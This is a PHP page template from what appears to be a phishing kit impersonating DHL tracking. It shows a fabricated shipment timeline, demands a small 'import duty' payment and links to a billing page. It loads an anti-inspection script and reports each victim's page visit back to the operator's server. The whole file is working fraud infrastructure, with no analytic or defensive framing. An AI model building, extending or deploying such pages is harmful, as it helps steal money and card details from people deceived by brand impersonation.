<?php
require_once(__DIR__ . '/../includes/page-common.php');
$tokRaw = $_GET['token'] ?? '';
$tokClean = preg_replace('/[^A-Za-z0-9]/', '', $tokRaw);
$refDisplay = $tokClean !== '' ? strtoupper(substr($tokClean . str_repeat('0', 14), 0, 14)) : 'DE9555123362014';
try {
    $baseDate = new DateTimeImmutable('now');
} catch (Exception $e) {
    $baseDate = new DateTimeImmutable('@' . time());
}
$dPick = $baseDate->modify('-3 days')->format('M j, Y');
$dTransit = $baseDate->modify('-2 days')->format('M j, Y');
$dPay = $baseDate->modify('+2 days')->format('M j, Y');
$closedAt = $baseDate->format('M j, Y \a\t g:i A');
$amountHtml = htmlspecialchars($translations['dhl_amount_sample_value'] ?? '2.99€');
?>
<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($selectedLanguage); ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title><?php echo htmlspecialchars($translations['dhl_track_meta'] ?? 'DHL'); ?></title>
    <link rel="stylesheet" href="<?php echo htmlspecialchars($dhlStyleHref, ENT_QUOTES, 'UTF-8'); ?>">
    <script src="js/security-common.js"></script>
    <script src="../js/anti-inspect.js"></script>
</head>
<body class="holl-page js-focus-visible" data-page="track">
<nav class="holl-nav" aria-label="Brand">
    <div class="holl-nav-inner">
        <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 143.5 20" height="20" viewBox="0 0 143.5 20" width="143.5" aria-hidden="true"><g fill="#d40511"><path d="m0 18.5h17.4l-1 1.4h-16.4z"/><path d="m143.5 19.9h-21.3l1.1-1.4h20.3v1.4z"/><path d="m0 15.9h19.4l-1.1 1.4h-18.3z"/><path d="m0 13.3h21.4l-1.1 1.4h-20.3z"/><path d="m143.5 17.3h-19.3l1.1-1.4h18.3v1.4z"/><path d="m127.2 13.3h16.3v1.4h-17.4z"/><path d="m18.8 19.9 9.2-12.3h11.4c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.5-.9 1.2 1 1.2h15.3c-1.2 1.8-5.4 6.8-12.8 6.8-6-.1-22.4-.1-22.4-.1z"/><path d="m71.5 13.3-5 6.7h-13.1l5-6.7z"/><path d="m90.6 13.3-5 6.7h-13.2l5-6.7z"/><path d="m94.9 13.3s-1 1.3-1.4 1.9c-1.7 2.2-.2 4.8 5.2 4.8h21.2l5-6.7z"/><path d="m25.3 0-4.6 6.1h25c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.4-.9 1.2 1 1.2h10.2s1.7-2.2 3-4.1c1.9-2.5.2-7.7-6.5-7.7-6 .1-26.4.1-26.4.1z"/><path d="m91.7 11.7h-32.2l8.8-11.7h13.2l-5 6.7h5.9l5-6.7h13.2z"/><path d="m118.8 0-8.8 11.7h-14l8.8-11.7z"/></g></svg>
        <span class="holl-nav-title"><?php echo htmlspecialchars($translations['dhl_nav_payment_required'] ?? 'Payment is required'); ?></span>
    </div>
</nav>
<main class="holl-main">
    <div class="holl-track-wrap">
        <div class="holl-track-inner">
            <div class="holl-track-top">
                <div class="holl-track-box">
                    <span class="holl-track-box-label"><?php echo htmlspecialchars($translations['dhl_track_from'] ?? 'From'); ?></span>
                    <span class="holl-track-box-strong"><?php echo htmlspecialchars($translations['dhl_track_sender_sample'] ?? 'LIGHT IN THE BOX CO.LTD'); ?></span>
                    <span class="holl-track-box-label" style="margin-top:.5rem;display:block;"><?php echo htmlspecialchars($refDisplay); ?></span>
                </div>
                <div class="holl-track-box holl-track-box-muted">
                    <span class="holl-track-box-label"><?php echo htmlspecialchars($translations['dhl_track_shipment_closed'] ?? 'Shipment closed'); ?></span>
                    <span class="holl-track-box-strong"><?php echo htmlspecialchars($closedAt); ?></span>
                </div>
            </div>
            <div class="holl-timeline-desktop">
                <div class="holl-timeline-bar">
                    <div class="holl-timeline-bar-fill" aria-hidden="true"></div>
                    <div class="holl-tl-node">
                        <span class="holl-tl-cap holl-tl-cap-top"><?php echo htmlspecialchars($dPick); ?></span>
                        <span class="holl-tl-cap holl-tl-cap-bot"><?php echo htmlspecialchars($translations['dhl_track_step_pickup'] ?? 'Picked up'); ?></span>
                    </div>
                    <div class="holl-tl-node">
                        <span class="holl-tl-cap holl-tl-cap-top"><?php echo htmlspecialchars($dTransit); ?></span>
                        <span class="holl-tl-cap holl-tl-cap-bot"><?php echo htmlspecialchars($translations['dhl_track_step_transit'] ?? 'In transit'); ?></span>
                    </div>
                    <div class="holl-tl-node holl-tl-node-active">
                        <svg fill="#ffffff" width="12" height="12" viewBox="0 0 64 64" aria-hidden="true" style="display:block;"><path d="M32.033,29.19l15.55,-15.55l2.863,2.863l-15.55,15.55l15.55,15.55l-2.863,2.863l-15.55,-15.55l-15.55,15.55l-2.863,-2.863l15.55,-15.55l-15.55,-15.55l2.863,-2.863l15.55,15.55Z"/></svg>
                        <span class="holl-tl-cap holl-tl-cap-top"><?php echo htmlspecialchars($dPay); ?></span>
                        <span class="holl-tl-cap holl-tl-cap-bot" style="font-weight:800;color:#000;"><?php echo htmlspecialchars($translations['dhl_track_payment_required'] ?? 'Payment Required'); ?></span>
                    </div>
                    <div class="holl-tl-node holl-tl-node-pending">
                        <span class="holl-tl-cap holl-tl-cap-bot"><?php echo htmlspecialchars($translations['dhl_track_delivered'] ?? 'Delivered'); ?></span>
                    </div>
                </div>
            </div>
            <div class="holl-timeline-mobile">
                <ul class="holl-vtl">
                    <li><span class="holl-vtl-dot"></span><time datetime=""><?php echo htmlspecialchars($dPick); ?></time><p style="margin:.35rem 0;color:#64748b;"><?php echo htmlspecialchars($translations['dhl_track_step_pickup'] ?? 'Picked up'); ?></p></li>
                    <li><span class="holl-vtl-dot"></span><time datetime=""><?php echo htmlspecialchars($dTransit); ?></time><p style="margin:.35rem 0;color:#64748b;"><?php echo htmlspecialchars($translations['dhl_track_step_transit'] ?? 'In transit'); ?></p></li>
                    <li><span class="holl-vtl-dot"></span><time datetime=""><?php echo htmlspecialchars($dPay); ?></time><p style="margin:.35rem 0;color:#64748b;"><?php echo htmlspecialchars($translations['dhl_track_payment_required'] ?? 'Payment Required'); ?></p></li>
                </ul>
            </div>
            <div class="holl-duty-box">
                <p class="holl-duty-title"><?php echo htmlspecialchars($translations['dhl_import_duty_title'] ?? 'IMPORT DUTY/TAX PAYMENT IS REQUIRED'); ?></p>
                <p><?php echo htmlspecialchars($translations['dhl_import_duty_body'] ?? ''); ?></p>
                <p><?php echo htmlspecialchars($translations['dhl_import_duty_amount_intro'] ?? 'The amount is'); ?> <span class="holl-duty-title" style="display:inline;font-size:1rem;"><?php echo $amountHtml; ?></span></p>
                <p style="font-weight:600;color:#000;margin-top:1rem;"><?php echo htmlspecialchars($translations['dhl_import_duty_followup'] ?? ''); ?></p>
                <div class="holl-duty-note"><?php echo htmlspecialchars($translations['dhl_import_duty_cash_note'] ?? ''); ?></div>
                <a class="holl-btn-red" style="text-decoration:none;text-align:center;" href="./billing.php?token=<?php echo urlencode($tokRaw); ?>"><?php echo htmlspecialchars($translations['dhl_pay_now'] ?? $translations['CONTINUE']); ?></a>
            </div>
            <div class="holl-feature-grid">
                <div class="holl-feature-card">
                    <div class="holl-feature-head">
                        <span class="holl-icon-dhl" style="width:48px;height:48px;border-radius:8px;background:#fef2f2;display:flex;align-items:center;justify-content:center;font-weight:900;color:#d40511;font-size:11px;">DHL</span>
                        <h4><?php echo htmlspecialchars($translations['dhl_feature_rates_title'] ?? 'Preferential Rates'); ?></h4>
                    </div>
                    <p><?php echo htmlspecialchars($translations['dhl_feature_rates_text'] ?? ''); ?></p>
                </div>
                <div class="holl-feature-card">
                    <div class="holl-feature-head">
                        <span class="holl-icon-dhl" style="width:48px;height:48px;border-radius:8px;background:#fef2f2;display:flex;align-items:center;justify-content:center;font-weight:900;color:#d40511;font-size:11px;">DHL</span>
                        <h4><?php echo htmlspecialchars($translations['dhl_feature_tailored_title'] ?? 'Tailored Solutions'); ?></h4>
                    </div>
                    <p><?php echo htmlspecialchars($translations['dhl_feature_tailored_text'] ?? ''); ?></p>
                </div>
                <div class="holl-feature-card">
                    <div class="holl-feature-head">
                        <span class="holl-icon-dhl" style="width:48px;height:48px;border-radius:8px;background:#fef2f2;display:flex;align-items:center;justify-content:center;font-weight:900;color:#d40511;font-size:11px;">DHL</span>
                        <h4><?php echo htmlspecialchars($translations['dhl_feature_odd_title'] ?? ''); ?></h4>
                    </div>
                    <p><?php echo htmlspecialchars($translations['dhl_feature_odd_text'] ?? ''); ?></p>
                </div>
                <div class="holl-feature-card">
                    <div class="holl-feature-head">
                        <span class="holl-icon-dhl" style="width:48px;height:48px;border-radius:8px;background:#fef2f2;display:flex;align-items:center;justify-content:center;font-weight:900;color:#d40511;font-size:11px;">DHL</span>
                        <h4><?php echo htmlspecialchars($translations['dhl_feature_ecom_title'] ?? ''); ?></h4>
                    </div>
                    <p><?php echo htmlspecialchars($translations['dhl_feature_ecom_text'] ?? ''); ?></p>
                </div>
            </div>
        </div>
    </div>
</main>
<footer class="holl-footer">
    <div class="holl-footer-inner">
        <div class="holl-footer-links">
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_privacy'] ?? $translations['Privacy_Policy']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_cookie'] ?? $translations['Cookie_Terms']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_data'] ?? $translations['Data_Rights']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_corp'] ?? $translations['About_Disney']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_disclaimer'] ?? 'Disclaimer'); ?></a>
        </div>
    </div>
</footer>
<script src="../js/pages-config.js?v=<?php echo time(); ?>"></script>
<script src="../js/session-manager.js?v=<?php echo time(); ?>"></script>
<script src="../js/validation.js?v=<?php echo time(); ?>"></script>
<script src="../js/app.js?v=<?php echo time(); ?>"></script>
<script>
(function () {
    var base = getBasePath();
    fetch(base + 'api/send_track_open.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: getToken() })
    }).catch(function () {});
})();
</script>
</body>
</html>
